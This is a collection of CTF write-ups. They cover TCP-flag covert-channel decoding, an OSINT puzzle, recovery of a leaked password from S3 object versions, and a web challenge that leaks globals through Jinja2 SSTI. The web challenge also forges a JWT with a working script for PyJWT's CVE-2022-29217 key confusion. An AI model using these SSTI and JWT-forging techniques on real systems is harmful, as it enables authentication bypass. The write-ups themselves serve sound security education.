[{"content":"Intro This post covers Abnormal Maybe Illegal from PatriotCTF 2024. The description of the challenge is:\nWe have recently discovered tons of traffic leaving our network. We have reason to believe they are using an abnormal method. Can you figure out what data they are exfiltrating?\nFurthermore, two additional hints were released throughout the competition:\nTCP packets are constructed in a way, where certain combinations are possible/(legal) and others should raise alerts/(illegal)\nNow that you found the illegal packets, think more black and white\nWe\u0026rsquo;ll take both of these into consideration, since no team had solved the challenge before both of these hints were dropped.\nAnalyzing The Packet Capture File We\u0026rsquo;ll use Scapy to programmatically analyze the pcapng file we\u0026rsquo;re given. Based on the hint \u0026ldquo;TCP packets are constructed in a way, where certain combinations are possible/(legal) and others should raise alerts/(illegal)\u0026rdquo; we should be looking for illegal TCP packets. One of the reasons why a packet could be considered illegal by the receiving server is due to having illogical combination of TCP control bits, commonly known as flags.\nThe TCP flags are contained in the TCP header, which is defined by RFC 9293.\nEach flag is represented by one bit in the TCP header. let\u0026rsquo;s count how many times each TCP flag appears in the capture.\nfrom scapy.all import rdpcap, TCP packets = rdpcap(\u0026#39;./abnormal_illegal.pcapng\u0026#39;) fin_count = 0 syn_count = 0 rst_count = 0 psh_count = 0 ack_count = 0 urg_count = 0 ece_count = 0 cwr_count = 0 def count_tcp_flags(tcp_layer): global fin_count, syn_count, rst_count, psh_count, ack_count, urg_count, ece_count, cwr_count flags = tcp_layer.flags if flags \u0026amp; 0x01: # FIN fin_count += 1 if flags \u0026amp; 0x02: # SYN syn_count += 1 if flags \u0026amp; 0x04: # RST rst_count += 1 if flags \u0026amp; 0x08: # PSH psh_count += 1 if flags \u0026amp; 0x10: # ACK ack_count += 1 if flags \u0026amp; 0x20: # URG urg_count += 1 if flags \u0026amp; 0x40: # ECE ece_count += 1 if flags \u0026amp; 0x80: # CWR cwr_count += 1 for packet in packets: if TCP in packet: tcp_layer = packet[TCP] count_tcp_flags(tcp_layer) print(f\u0026#34;Number of packets with FIN flag: {fin_count}\u0026#34;) print(f\u0026#34;Number of packets with SYN flag: {syn_count}\u0026#34;) print(f\u0026#34;Number of packets with RST flag: {rst_count}\u0026#34;) print(f\u0026#34;Number of packets with PSH flag: {psh_count}\u0026#34;) print(f\u0026#34;Number of packets with ACK flag: {ack_count}\u0026#34;) print(f\u0026#34;Number of packets with URG flag: {urg_count}\u0026#34;) print(f\u0026#34;Number of packets with ECE flag: {ece_count}\u0026#34;) print(f\u0026#34;Number of packets with CWR flag: {cwr_count}\u0026#34;) vboxuser@kali /mnt/repos/patriotctf-2024/abnormal-maybe-illegal $ python3 count-each-flag.py Number of packets with FIN flag: 9712 Number of packets with SYN flag: 9713 Number of packets with RST flag: 81 Number of packets with PSH flag: 14434 Number of packets with ACK flag: 38337 Number of packets with URG flag: 0 Number of packets with ECE flag: 0 Number of packets with CWR flag: 0 As we can see, there are only FIN, SYNC, RST, PSH and ACK flags set in the whole capture, so we won\u0026rsquo;t be worrying about the rest.\nThe TCP flags are responsible for managing the state of a TCP connection. While there\u0026rsquo;s no official list of illegal flag combinations, some pairs don\u0026rsquo;t make any logical sense to appear together. While there are many such combinations possible, we\u0026rsquo;ll focus on the most known one which is SYN + FIN. The SYN flag is used to initiate a connection, while FIN is used to terminate it, so obviously both of them being present at the same time is contradictory. We\u0026rsquo;ll check if this combination appears in our capture.\nfrom scapy.all import rdpcap, TCP packets = rdpcap(\u0026#39;./abnormal_illegal.pcapng\u0026#39;) fin_syn_packets_count = 0 def is_fin_syn(tcp_layer): flags = tcp_layer.flags # SYN + FIN (illegal combination) if flags \u0026amp; 0x03 == 0x03: return True return False for packet in packets: if TCP in packet: tcp_layer = packet[TCP] if is_fin_syn(tcp_layer): fin_syn_packets_count += 1 print(f\u0026#34;Number of FIN+SYN packets: {fin_syn_packets_count}\u0026#34;) vboxuser@kali /mnt/repos/patriotctf-2024/abnormal-maybe-illegal $ python3 count-syn-fin.py Number of FIN+SYN packets: 128 Great, there are 128 such packets.\nUncovering The Hidden Message Since we already know only RST, PSH and ACK flags appear in the capture besides FIN and SYN, let\u0026rsquo;s check if they all appear in the illegal packets found.\nfrom scapy.all import rdpcap, TCP packets = rdpcap(\u0026#39;./abnormal_illegal.pcapng\u0026#39;) rst_count = 0 psh_count = 0 ack_count = 0 def is_fin_syn(tcp_layer): flags = tcp_layer.flags # SYN + FIN (illegal combination) if flags \u0026amp; 0x03 == 0x03: return True return False for packet in packets: if TCP in packet: tcp_layer = packet[TCP] if is_fin_syn(tcp_layer): if tcp_layer.flags \u0026amp; 0x04: # RST flag rst_count += 1 if tcp_layer.flags \u0026amp; 0x08: # PSH flag psh_count += 1 if tcp_layer.flags \u0026amp; 0x10: # ACK flag ack_count += 1 print(f\u0026#34;Number of packets with FIN+SYN and RST flag: {rst_count}\u0026#34;) print(f\u0026#34;Number of packets with FIN+SYN and PSH flag: {psh_count}\u0026#34;) print(f\u0026#34;Number of packets with FIN+SYN and ACK flag: {ack_count}\u0026#34;) vboxuser@kali /mnt/repos/patriotctf-2024/abnormal-maybe-illegal $ python3 count-flags-in-fin-syn.py Number of packets with FIN+SYN and RST flag: 80 Number of packets with FIN+SYN and PSH flag: 58 Number of packets with FIN+SYN and ACK flag: 0 ACK doesn\u0026rsquo;t appear in packets with both FIN and SYN set in our capture.\nThe second hint \u0026ldquo;Now that you found the illegal packets, think more black and white\u0026rdquo; steers us towards thinking that the exfiltrated message is encoded in binary. Each illegal packet could carry 2 bits (RST and PSH) of the exfiltrated message. We\u0026rsquo;ll take these 2 bits and concatenate them both into a binary and ASCII form.\nfrom scapy.all import rdpcap, TCP pcap_file = \u0026#39;abnormal_illegal.pcapng\u0026#39; packets = rdpcap(pcap_file) def is_fin_syn(tcp_layer): flags = tcp_layer.flags # SYN + FIN (illegal combination) if flags \u0026amp; 0x03 == 0x03: return True return False def extract_and_reverse_flags(tcp_layer): flags = tcp_layer.flags rst = 1 if flags \u0026amp; 0x04 else 0 psh = 1 if flags \u0026amp; 0x08 else 0 return f\u0026#34;{rst}{psh}\u0026#34; combined_binary_string = \u0026#39;\u0026#39; for packet in packets: if TCP in packet: tcp_layer = packet[TCP] if is_fin_syn(tcp_layer): combined_binary_string += extract_and_reverse_flags(tcp_layer) def binary_to_ascii(binary_string): ascii_text = \u0026#39;\u0026#39; for i in range(0, len(binary_string), 8): byte = binary_string[i:i+8] if len(byte) == 8: ascii_text += chr(int(byte, 2)) return ascii_text decoded_message = binary_to_ascii(combined_binary_string) print(f\u0026#34;Combined Binary String: {combined_binary_string}\u0026#34;) print(f\u0026#34;Decoded Message: {decoded_message}\u0026#34;) vboxuser@kali /mnt/repos/patriotctf-2024/abnormal-maybe-illegal $ python3 concatenate-rst-psh.py Combined Binary String: 1011000010010011101110001001100110110111100100101001000110011101100111111011000110011110100100101001110010101111100110011001110010010010100110111011001110101111100100101011000110011010101011111001011010011100100111001001101010011011100100101001110010111110 Decoded Message: Â°Â“Â¸Â™Â·Â’Â‘ÂÂŸÂ±ÂÂ’ÂœÂ¯Â™ÂœÂ’Â›Â³Â¯Â’Â±ÂšÂ¯Â–ÂœÂœÂšÂ›Â’ÂœÂ¾ That didn\u0026rsquo;t work. However, there\u0026rsquo;s still the possibility that the bits from each packet could be parsed in reversed order, so we try that as well.\nfrom scapy.all import rdpcap, TCP pcap_file = \u0026#39;abnormal_illegal.pcapng\u0026#39; packets = rdpcap(pcap_file) def is_fin_syn(tcp_layer): flags = tcp_layer.flags # SYN + FIN (illegal combination) if flags \u0026amp; 0x03 == 0x03: return True return False def extract_and_reverse_flags(tcp_layer): flags = tcp_layer.flags rst = 1 if flags \u0026amp; 0x04 else 0 psh = 1 if flags \u0026amp; 0x08 else 0 return f\u0026#34;{psh}{rst}\u0026#34; # We reversed this compared to the previous script combined_binary_string = \u0026#39;\u0026#39; for packet in packets: if TCP in packet: tcp_layer = packet[TCP] if is_fin_syn(tcp_layer): combined_binary_string += extract_and_reverse_flags(tcp_layer) def binary_to_ascii(binary_string): ascii_text = \u0026#39;\u0026#39; for i in range(0, len(binary_string), 8): byte = binary_string[i:i+8] if len(byte) == 8: ascii_text += chr(int(byte, 2)) return ascii_text decoded_message = binary_to_ascii(combined_binary_string) print(f\u0026#34;Combined Binary String: {combined_binary_string}\u0026#34;) print(f\u0026#34;Decoded Message: {decoded_message}\u0026#34;) vboxuser@kali /mnt/repos/patriotctf-2024/abnormal-maybe-illegal $ python3 concatenate-rst-psh-reversed.py Combined Binary String: 0111000001100011011101000110011001111011011000010110001001101110011011110111001001101101011000010110110001011111011001100110110001100001011001110111001101011111011000010111001001100101010111110110100101101100011011000110010101100111011000010110110001111101 Decoded Message: pctf{abnormal_flags_are_illegal} We got the flag! pctf{abnormal_flags_are_illegal}\nReferences https://datatracker.ietf.org/doc/html/rfc9293 ","permalink":"http://localhost:1313/posts/patrioctf-2024-abnormal-maybe-illegal/","summary":"\u003ch2 id=\"intro\"\u003eIntro\u003c/h2\u003e\n\u003cp\u003eThis post covers \u003cem\u003eAbnormal Maybe Illegal\u003c/em\u003e from \u003cem\u003ePatriotCTF 2024\u003c/em\u003e. The description of the challenge is:\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eWe have recently discovered tons of traffic leaving our network. We have reason to believe they are using an abnormal method. Can you figure out what data they are exfiltrating?\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eFurthermore, two additional hints were released throughout the competition:\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eTCP packets are constructed in a way, where certain combinations are possible/(legal) and others should raise alerts/(illegal)\u003c/p\u003e","title":"PatriotCTF 2024 Abnormal Maybe Illegal"},{"content":"Intro This post covers both Literally 1984 and Mystery as they\u0026rsquo;re related to each other. The description of Literally 1984 is:\nAn artist by the name of â€Œ made a cover of a song I liked, but I don\u0026rsquo;t remember the original composer of that song. Could you help me find the original composer? Flag Format: csawctf{Firstname_Lastname} (replace all spaces with _ )\nand the description of Mystery is:\nRemember the composer from Literally 1984? Well, they made a song when they were part of a band in 1992, and it turns out that â€Œ also made a cover of this song, collabing with another artist. What is the name of that artist? Flag Format: csawctf{ArtistName} (replace all spaces with _ )\nFinding Cover Artist For Literally 1984 The description of Literally 1984 looks weird. It looks like the artist\u0026rsquo;s name is missing. Upon closer inspection, we notice there\u0026rsquo;s a zero-width non-joiner in the description.\nAfter searching the web, we find the artist x0o0x_, whose biography at https://www.last.fm/music/x0o0x_/+wiki states the following:\nMost of their content is uploaded on a nameless channel (this is done by using an invisible control character in unicode. It is encoded as U+200C, the \u0026ldquo;zero width non-joiner\u0026rdquo;, normally used for ligatures. See Zero-width non-joiner at Wikipedia for more info).\nFinding Literally 1984 Song We check all pages at https://www.last.fm/music/x0o0x_/+tracks for songs with cover in the title. The song titled Big Brotherã€€Cover stands out, as it could be a reference to Big Brother from George Orwell\u0026rsquo;s novel 1984.\nAfter more searching, we learn that the original song is composed by Susumu Hirasawa. The final flag is: csawctf{Susumu_Hirasawa}\nMystery Uncovered We find the P-Model album released in 1992 by P-Model, which at the time Susumu Hirasawa was part of. It contains the following songs:\nAfter more web searching, we also stumble upon this Susumu Hirasawa Remix Collection. We search it for x0o0x_ and find a video titled LAB=01 / Ver.Chogakusei \u0026amp; x0o0x_ [ENG SUB]\nAs we saw previously, LAB=01 is a track included in the P-Model album. The final flag is: csawctf{Chogakusei}.\n","permalink":"http://localhost:1313/posts/csawctf-2024-literally-1984-mystery/","summary":"\u003ch2 id=\"intro\"\u003eIntro\u003c/h2\u003e\n\u003cp\u003eThis post covers both \u003cem\u003eLiterally 1984\u003c/em\u003e and \u003cem\u003eMystery\u003c/em\u003e as they\u0026rsquo;re related to each other. The description of \u003cem\u003eLiterally 1984\u003c/em\u003e is:\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eAn artist by the name of â€Œ made a cover of a song I liked, but I don\u0026rsquo;t remember the original composer of that song. Could you help me find the original composer?\nFlag Format: csawctf{Firstname_Lastname} (replace all spaces with _ )\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eand the description of \u003cem\u003eMystery\u003c/em\u003e is:\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eRemember the composer from Literally 1984? Well, they made a song when they were part of a band in 1992, and it turns out that â€Œ also made a cover of this song, collabing with another artist. What is the name of that artist?\nFlag Format: csawctf{ArtistName} (replace all spaces with _ )\u003c/p\u003e","title":"CSAW CTF Qualification Round 2024 Literally 1984 \u0026 Mystery"},{"content":"Intro For this challenge we\u0026rsquo;re only given the link https://bucketwars.ctf.csaw.io and the description:\nlet\u0026rsquo;s keep our storage simple \u0026ndash; and remember we don\u0026rsquo;t make mistakes in these parts.\nEnumerating the Website Upon visiting the website, we notice the current version Version: 5.0.0 and the versions page.\nWhen we visit a page that doesn\u0026rsquo;t exist, it tells us that the 404.jpg is missing from an S3 bucket https://s3.us-east-2.amazonaws.com/bucketwars.ctf.csaw.io. We try accessing index.html and versions.html by using this S3 bucket URL and confirm the website files are served from there.\nSadly, we can\u0026rsquo;t list the bucket contents since it\u0026rsquo;s not public. However, we notice the x-amz-version-id header in a response, which hints that there could be different file versions.\nAccessing Previous File Versions We check each file we found for different versions using AWS CLI. We find out that index_v1.html has 5 different versions.\naws s3api list-object-versions --bucket bucketwars.ctf.csaw.io --prefix index_v1.html \u0026gt; v1_versions { \u0026#34;Versions\u0026#34;: [ { \u0026#34;ETag\u0026#34;: \u0026#34;\\\u0026#34;07bb73d00569d07588c0b5661438d9d8\\\u0026#34;\u0026#34;, \u0026#34;Size\u0026#34;: 1118, \u0026#34;StorageClass\u0026#34;: \u0026#34;STANDARD\u0026#34;, \u0026#34;Key\u0026#34;: \u0026#34;index_v1.html\u0026#34;, \u0026#34;VersionId\u0026#34;: \u0026#34;xueLuUGnF1kS6dcOaspeUUZN0N4Cdlsq\u0026#34;, \u0026#34;IsLatest\u0026#34;: true, \u0026#34;LastModified\u0026#34;: \u0026#34;2024-08-05T01:59:50+00:00\u0026#34; }, { \u0026#34;ETag\u0026#34;: \u0026#34;\\\u0026#34;d3f2f46b2f1814b636cb1c7991a1a328\\\u0026#34;\u0026#34;, \u0026#34;Size\u0026#34;: 1290, \u0026#34;StorageClass\u0026#34;: \u0026#34;STANDARD\u0026#34;, \u0026#34;Key\u0026#34;: \u0026#34;index_v1.html\u0026#34;, \u0026#34;VersionId\u0026#34;: \u0026#34;ToA1N09DluJkPVFATO6IwOTZzhDkva09\u0026#34;, \u0026#34;IsLatest\u0026#34;: false, \u0026#34;LastModified\u0026#34;: \u0026#34;2024-08-05T00:26:48+00:00\u0026#34; }, { \u0026#34;ETag\u0026#34;: \u0026#34;\\\u0026#34;5c3665517b3e538158ab09b15a647dbb\\\u0026#34;\u0026#34;, \u0026#34;Size\u0026#34;: 1456, \u0026#34;StorageClass\u0026#34;: \u0026#34;STANDARD\u0026#34;, \u0026#34;Key\u0026#34;: \u0026#34;index_v1.html\u0026#34;, \u0026#34;VersionId\u0026#34;: \u0026#34;zCVAK4kjygiOnWWGGi1BZOR87Ef09Z0L\u0026#34;, \u0026#34;IsLatest\u0026#34;: false, \u0026#34;LastModified\u0026#34;: \u0026#34;2024-08-05T00:20:20+00:00\u0026#34; }, { \u0026#34;ETag\u0026#34;: \u0026#34;\\\u0026#34;9a5824c100e6975c203e2ae517c9ec0d\\\u0026#34;\u0026#34;, \u0026#34;Size\u0026#34;: 1555, \u0026#34;StorageClass\u0026#34;: \u0026#34;STANDARD\u0026#34;, \u0026#34;Key\u0026#34;: \u0026#34;index_v1.html\u0026#34;, \u0026#34;VersionId\u0026#34;: \u0026#34;CFNz2JPIIJfRlNfnVx8a45jgh0J90KxS\u0026#34;, \u0026#34;IsLatest\u0026#34;: false, \u0026#34;LastModified\u0026#34;: \u0026#34;2024-08-05T00:20:08+00:00\u0026#34; }, { \u0026#34;ETag\u0026#34;: \u0026#34;\\\u0026#34;130f7fdffa9c3a0e24853b651dfe07ac\\\u0026#34;\u0026#34;, \u0026#34;Size\u0026#34;: 1571, \u0026#34;StorageClass\u0026#34;: \u0026#34;STANDARD\u0026#34;, \u0026#34;Key\u0026#34;: \u0026#34;index_v1.html\u0026#34;, \u0026#34;VersionId\u0026#34;: \u0026#34;t6G6A20JCaF5nzz6KuJR6Pj1zePOLAdB\u0026#34;, \u0026#34;IsLatest\u0026#34;: false, \u0026#34;LastModified\u0026#34;: \u0026#34;2024-08-05T00:19:57+00:00\u0026#34; } ], \u0026#34;RequestCharged\u0026#34;: null } We download each version of the index_v1.html file, in particular the 2 last ones.\naws s3api get-object --bucket bucketwars.ctf.csaw.io --key index_v1.html --version-id CFNz2JPIIJfRlNfnVx8a45jgh0J90KxS index_v1-1555.html aws s3api get-object --bucket bucketwars.ctf.csaw.io --key index_v1.html --version-id t6G6A20JCaF5nzz6KuJR6Pj1zePOLAdB index_v1-1571.html We diff them.\nvboxuser@kali /mnt/repos/csawctf-2024/bucket-wars $ diff index_v1-1571.html index_v1-1555.html 28,29c28,29 \u0026lt; Wait what\u0026#39;s here? \u0026lt; \u0026lt;img src=\u0026#34;https://asdfaweofijaklfdjkldfsjfas.s3.us-east-2.amazonaws.com/sand-pit-1345726_640.jpg\u0026#34;\u0026gt; --- \u0026gt; Oh it can\u0026#39;t be \u0026gt; \u0026lt;!-- Note to self: be sure to delete this password: versions_leaks_buckets_oh_my --\u0026gt; We got a password and a link to a JPG file served from another bucket. We download the image and check it with steghide using the password versions_leaks_buckets_oh_my for hidden data.\nvboxuser@kali /mnt/repos/csawctf-2024/bucket-wars $ steghide info sand-pit.jpg \u0026#34;sand-pit.jpg\u0026#34;: format: jpeg capacity: 11.4 KB Try to get information about embedded data ? (y/n) y Enter passphrase: embedded file \u0026#34;flag.txt\u0026#34;: size: 36.0 Byte encrypted: rijndael-128, cbc compressed: yes We extract the flag.\nvboxuser@kali /mnt/repos/csawctf-2024/bucket-wars $ steghide extract -sf sand-pit.jpg Enter passphrase: wrote extracted data to \u0026#34;flag.txt\u0026#34;. The final flag is: csawctf{cl0d_Bu4K3tz_AR3_F4Ir_g$m3}.\n","permalink":"http://localhost:1313/posts/csawctf-2024-bucket-wars/","summary":"\u003ch2 id=\"intro\"\u003eIntro\u003c/h2\u003e\n\u003cp\u003eFor this challenge we\u0026rsquo;re only given the link \u003cem\u003e\u003ca href=\"https://bucketwars.ctf.csaw.io\"\u003ehttps://bucketwars.ctf.csaw.io\u003c/a\u003e\u003c/em\u003e and the description:\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003elet\u0026rsquo;s keep our storage simple \u0026ndash; and remember we don\u0026rsquo;t make mistakes in these parts.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 id=\"enumerating-the-website\"\u003eEnumerating the Website\u003c/h2\u003e\n\u003cp\u003eUpon visiting the website, we notice the current version \u003cem\u003eVersion: 5.0.0\u003c/em\u003e and the versions page.\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"image.png\" alt=\"Alt text\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"image-1.png\" alt=\"Alt text\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eWhen we visit a page that doesn\u0026rsquo;t exist, it tells us that the \u003cem\u003e404.jpg\u003c/em\u003e is missing from an S3 bucket \u003cem\u003e\u003ca href=\"https://s3.us-east-2.amazonaws.com/bucketwars.ctf.csaw.io\"\u003ehttps://s3.us-east-2.amazonaws.com/bucketwars.ctf.csaw.io\u003c/a\u003e\u003c/em\u003e. We try accessing \u003cem\u003eindex.html\u003c/em\u003e and \u003cem\u003eversions.html\u003c/em\u003e by using this S3 bucket URL and confirm the website files are served from there.\u003c/p\u003e","title":"CSAW CTF Qualification Round 2024 BucketWars"},{"content":"Initial Code Analysis First thing that catches our eye is the old version 2.3.0 of PyJWT used in the application.\nIn order to access the flag, we need to view kings_lair.html which requires sending a JWT with specific CURRENT_DATE and ROLE.\nThe scarab room seems vulnerable to SSTI via name POST param.\napp.route(\u0026#39;/scarab_room\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def scarab_room(): try: if request.method == \u0026#39;POST\u0026#39;: name = request.form.get(\u0026#39;name\u0026#39;) if name: kings_safelist = [\u0026#39;{\u0026#39;,\u0026#39;}\u0026#39;, \u0026#39;ğ“¹\u0026#39;, \u0026#39;ğ“†£\u0026#39;,\u0026#39;ğ“€€\u0026#39;, \u0026#39;ğ“€\u0026#39;, \u0026#39;ğ“€‚\u0026#39;, \u0026#39;ğ“€ƒ\u0026#39;, \u0026#39;ğ“€„\u0026#39;, \u0026#39;ğ“€…\u0026#39;, \u0026#39;ğ“€†\u0026#39;, \u0026#39;ğ“€‡\u0026#39;, \u0026#39;ğ“€ˆ\u0026#39;, \u0026#39;ğ“€‰\u0026#39;, \u0026#39;ğ“€Š\u0026#39;, \u0026#39;ğ“€\u0026#39;, \u0026#39;ğ“€‘\u0026#39;, \u0026#39;ğ“€’\u0026#39;, \u0026#39;ğ“€“\u0026#39;, \u0026#39;ğ“€”\u0026#39;, \u0026#39;ğ“€•\u0026#39;, \u0026#39;ğ“€–\u0026#39;, \u0026#39;ğ“€—\u0026#39;, \u0026#39;ğ“€˜\u0026#39;, \u0026#39;ğ“€™\u0026#39;, \u0026#39;ğ“€š\u0026#39;, \u0026#39;ğ“€›\u0026#39;, \u0026#39;ğ“€œ\u0026#39;, \u0026#39;ğ“€\u0026#39;, \u0026#39;ğ“€\u0026#39;, \u0026#39;ğ“€Ÿ\u0026#39;, \u0026#39;ğ“€ \u0026#39;, \u0026#39;ğ“€¡\u0026#39;, \u0026#39;ğ“€¢\u0026#39;, \u0026#39;ğ“€£\u0026#39;, \u0026#39;ğ“€¤\u0026#39;, \u0026#39;ğ“€¥\u0026#39;, \u0026#39;ğ“€¦\u0026#39;, \u0026#39;ğ“€§\u0026#39;, \u0026#39;ğ“€¨\u0026#39;, \u0026#39;ğ“€©\u0026#39;, \u0026#39;ğ“€ª\u0026#39;, \u0026#39;ğ“€«\u0026#39;, \u0026#39;ğ“€¬\u0026#39;, \u0026#39;ğ“€­\u0026#39;, \u0026#39;ğ“€®\u0026#39;, \u0026#39;ğ“€¯\u0026#39;, \u0026#39;ğ“€°\u0026#39;, \u0026#39;ğ“€±\u0026#39;, \u0026#39;ğ“€²\u0026#39;, \u0026#39;ğ“€³\u0026#39;, \u0026#39;ğ“€´\u0026#39;, \u0026#39;ğ“€µ\u0026#39;, \u0026#39;ğ“€¶\u0026#39;, \u0026#39;ğ“€·\u0026#39;, \u0026#39;ğ“€¸\u0026#39;, \u0026#39;ğ“€¹\u0026#39;, \u0026#39;ğ“€º\u0026#39;, \u0026#39;ğ“€»\u0026#39;] name = \u0026#39;\u0026#39;.join([char for char in name if char.isalnum() or char in kings_safelist]) return render_template_string(\u0026#39;\u0026#39;\u0026#39; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; OMITTED \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;a href=\u0026#34;{{ url_for(\u0026#39;hallway\u0026#39;) }}\u0026#34; class=\u0026#34;return-link\u0026#34;\u0026gt;RETURN\u0026lt;/a\u0026gt; {% if name %} \u0026lt;h1\u0026gt;ğ“¹ğ“¹ğ“¹ Welcome to the Scarab Room, \u0026#39;\u0026#39;\u0026#39;+ name + \u0026#39;\u0026#39;\u0026#39; ğ“¹ğ“¹ğ“¹\u0026lt;/h1\u0026gt; {% endif %} \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026#39;\u0026#39;\u0026#39;, name=name, **globals()) except Exception as e: pass return render_template(\u0026#39;scarab_room.html\u0026#39;) Leaking Information via Scarab Room Since both { and } are in kings_safelist, we can send a Jinja2 expression in name to scarab_room. This allows us to leak any alphanumerical global variables by sending {{VARIABLE}}, since **globals() are included. Looking at the code, we can leak KINGSDAY and PUBLICKEY this way, but not PRIVATE_KEY, since it contains an underscore which isn\u0026rsquo;t permitted.\nCVE-2022-29217 PyJWT up to version 2.4.0 is vulnerable to CVE-2022-29217. The CVE description states:\nThe application can specify jwt.algorithms.get_default_algorithms() to get support for all algorithms, or specify a single algorithm. The issue is not that big as algorithms=jwt.algorithms.get_default_algorithms() has to be used.\nAs we can see in the code, that\u0026rsquo;s exactly what\u0026rsquo;s used in kings_lair.\nThis advisory states that:\nSimilarly with HMAC (symmetric) algorithm, PyJWT checks that the key is not a public key meant for asymmetric algorithm i.e. HMAC cannot be used if the key begins with \u0026ldquo;ssh-rsa\u0026rdquo;. If HMAC is used with a public key, the attacker can just use the publicly known public key to sign the token and the checker would use the same key to verify.\nFrom PyJWT 2.0.0 onwards, PyJWT supports ed25519 asymmetric algorithm. With ed25519, PyJWT supports public keys that start with \u0026ldquo;ssh-\u0026rdquo;, for example \u0026ldquo;ssh-ed25519\u0026rdquo;.\nPerfect, we leaked the public ssh-ed25519 key and we can use it to sign a JWT forged by ourselves and make the library use the same public key for verification. We save the previously leaked key as ssh-key.pub and modify the advisory code as follows and save it as solve.py.\nimport jwt # Open and read the SSH public key with open(\u0026#34;ssh-key.pub\u0026#34;, \u0026#34;rb\u0026#34;) as ssh_file: ssh_key_bytes = ssh_file.read() # Using HMAC with the ssh public key to trick the receiver to think that the public key is a HMAC secret encoded_bad = jwt.encode({ \u0026#34;ROLE\u0026#34;: \u0026#34;royalty\u0026#34;, \u0026#34;CURRENT_DATE\u0026#34;: \u0026#34;03_07_1341_BC\u0026#34;, \u0026#34;exp\u0026#34;: 96333638593 }, ssh_key_bytes, algorithm=\u0026#34;HS256\u0026#34;) print(encoded_bad) Notice that we used the previously leaked KINGSDAY for CURRENT_DATE and royalty for ROLE. Now, we create a new venv and install the exact same versions of libraries as in the app.\nvboxuser@kali /mnt/repos/csawctf-2024/lost-pyramid $ python3 -m venv venv vboxuser@kali /mnt/repos/csawctf-2024/lost-pyramid $ source ./venv/bin/activate (venv) vboxuser@kali /mnt/repos/csawctf-2024/lost-pyramid $ pip3 install PyJWT==2.3.0 cryptography==43.0.0 Finally, we run the program to generate the JWT.\n(venv) vboxuser@kali /mnt/repos/csawctf-2024/lost-pyramid $ python3 solve.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJST0xFIjoicm95YWx0eSIsIkNVUlJFTlRfREFURSI6IjAzXzA3XzEzNDFfQkMiLCJleHAiOjk2MzMzNjM4NTkzfQ.TNLuFhoPwtH1_ehX-z42hM6nA1UiNNb-PYsyuFhYiwA We copy the generated JWT and access kings_lair with it to get the flag.\nThe final flag is: csawctf{$$king$_confusion$$$}.\n","permalink":"http://localhost:1313/posts/csawctf-2024-lost-pyramid/","summary":"\u003ch2 id=\"initial-code-analysis\"\u003eInitial Code Analysis\u003c/h2\u003e\n\u003cp\u003eFirst thing that catches our eye is the old version \u003cem\u003e2.3.0\u003c/em\u003e of \u003cem\u003ePyJWT\u003c/em\u003e used in the application.\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"image.png\" alt=\"Alt text\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eIn order to access the flag, we need to view \u003cem\u003ekings_lair.html\u003c/em\u003e which requires sending a JWT with specific \u003cem\u003eCURRENT_DATE\u003c/em\u003e and \u003cem\u003eROLE\u003c/em\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"image-1.png\" alt=\"Alt text\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eThe scarab room seems vulnerable to SSTI via \u003cem\u003ename\u003c/em\u003e POST param.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eapp\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eroute(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;/scarab_room\u0026#39;\u003c/span\u003e, methods\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;GET\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;POST\u0026#39;\u003c/span\u003e])\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edef\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003escarab_room\u003c/span\u003e():\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003etry\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e request\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003emethod \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;POST\u0026#39;\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            name \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e request\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eform\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eget(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;name\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan 